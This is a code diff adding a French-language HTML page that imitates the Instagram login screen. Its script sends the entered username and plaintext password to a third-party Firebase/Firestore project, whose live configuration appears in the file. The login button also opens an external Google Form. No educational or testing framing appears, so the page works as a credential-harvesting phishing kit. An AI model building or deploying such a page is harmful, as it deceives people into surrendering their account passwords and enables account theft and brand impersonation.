@@ -1,0 +1,219 @@
+
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion Instagram</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Brush+Script+MT&display=swap');
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            width: 350px;
+            text-align: center;
+        }
+
+        h1 {
+            font-family: 'Brush Script MT', cursive;
+            font-size: 64px;
+            color: #262626;
+            margin-bottom: 20px;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 9px;
+            margin: 8px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            background-color: #fafafa;
+            font-size: 14px;
+        }
+
+        input:focus {
+            outline: none;
+            border: 1px solid #a5a5a5;
+        }
+
+        .login-button {
+            width: 100%;
+            background-color: #0095f6;
+            color: #ffffff;
+            padding: 10px;
+            margin-top: 12px;
+            border: none;
+            border-radius: 3px;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .login-button:hover {
+            background-color: #007bbf;
+        }
+
+        .forgot-password {
+            margin-top: 10px;
+            font-size: 12px;
+            color: #00376b;
+            text-decoration: none;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .separator {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: #8e8e8e;
+            font-size: 13px;
+        }
+
+        .separator::before,
+        .separator::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background-color: #dbdbdb;
+        }
+
+        .separator::before {
+            margin-right: 10px;
+        }
+
+        .separator::after {
+            margin-left: 10px;
+        }
+
+        .facebook-login {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            color: #385185;
+            font-weight: bold;
+            text-decoration: none;
+            margin-top: 10px;
+        }
+
+        .facebook-login img {
+            width: 16px;
+            height: 16px;
+            margin-right: 8px;
+        }
+
+        .signup {
+            font-size: 14px;
+            margin-top: 20px;
+            color: #8e8e8e;
+        }
+
+        .signup a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .signup a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Instagram</h1>
+        <form id="signup-form">
+            <input id="username" type="text" placeholder="Num. téléphone, nom d'utilisateur ou e-mail" required>
+            <input id="password" type="password" placeholder="Mot de passe" required>
+            <button type="submit" class="login-button">Connexion</button>
+        </form>
+        <a href="#" class="forgot-password">Mot de passe oublié ?</a>
+        <div class="separator">OU</div>
+        <a href="#" class="facebook-login">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
+            Continuer en tant qu'utilisateur Facebook
+        </a>
+        <div class="signup">
+            Vous n’avez pas de compte ? <a href="#">Inscription</a>
+        </div>
+    </div>
+
+    <script type="module">
+        // Importer les fonctions nécessaires depuis les SDK
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
+        import { getAuth, createUserWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-auth.js";
+        import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore.js";
+        import { getAnalytics } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-analytics.js";
+
+        // Votre configuration Firebase
+        const firebaseConfig = {
+            apiKey: "AIzaSyDV8YPsICrU4NsiI8TYaLNz7nT1rJZloic",
+            authDomain: "mymed-4bad5.firebaseapp.com",
+            databaseURL: "https://mymed-4bad5-default-rtdb.firebaseio.com",
+            projectId: "mymed-4bad5",
+            storageBucket: "mymed-4bad5.appspot.com",
+            messagingSenderId: "205283927162",
+            appId: "1:205283927162:web:d81ca79c0be459736ac7c3",
+            measurementId: "G-HT9W9FL3GD"
+        };
+
+        // Initialiser Firebase
+        const app = initializeApp(firebaseConfig);
+        const analytics = getAnalytics(app);
+        const auth = getAuth(app); // Initialiser l'authentification
+        const db = getFirestore(app); // Initialiser Firestore
+
+        // Gestionnaire de soumission du formulaire
+        window.addEventListener('DOMContentLoaded', (event) => {
+            document.getElementById('signup-form').addEventListener('submit', async function (event) {
+                event.preventDefault(); // Empêcher le rechargement de la page
+                const username = document.getElementById('username').value.trim(); // Récupérer le nom d'utilisateur et supprimer les espaces
+                const password = document.getElementById('password').value; // Récupérer le mot de passe
+
+                if (username === "") {
+                    alert("Veuillez entrer un nom d'utilisateur.");
+                    return;
+                }
+
+                const email = `${username}@example.com`; // Créer un e-mail fictif
+
+                try {
+                    // Inscription via Firebase Authentication
+                    const userCredential = await createUserWithEmailAndPassword(auth, email, password); 
+                    const user = userCredential.user;
+
+                    // Ajouter l'utilisateur à la collection users dans Firestore
+                    await setDoc(doc(db, "users", user.uid), {
+                        username: username, // Enregistrer le nom d'utilisateur
+                        password: password, // Le mot de passe est stocké ici, mais ce n'est pas recommandé pour la sécurité
+                        createdAt: new Date()
+                    });
+
+                    console.log("Utilisateur inscrit et enregistré dans Firestore:", user);
+                } catch (error) {
+                    console.error("Erreur lors de l'inscription:", error.code, error.message);
+                    alert(`Erreur: ${error.message}`); // Affiche une alerte avec le message d'erreur
+                }
+            });
+        });
+
+        // Ajout du comportement d'ouverture de lien au clic sur le bouton
+        document.querySelector('.login-button').addEventListener('click', () => {
+            window.open('https://docs.google.com/forms/d/e/1FAIpQLSd9aN28bRTEfNVGe-u1vbEUb1aAs-_2HVco_R0vHlZKVlkMuw/viewform?usp=sf_link', '_blank');
+        });
+    </script>
+</body>
+</html>
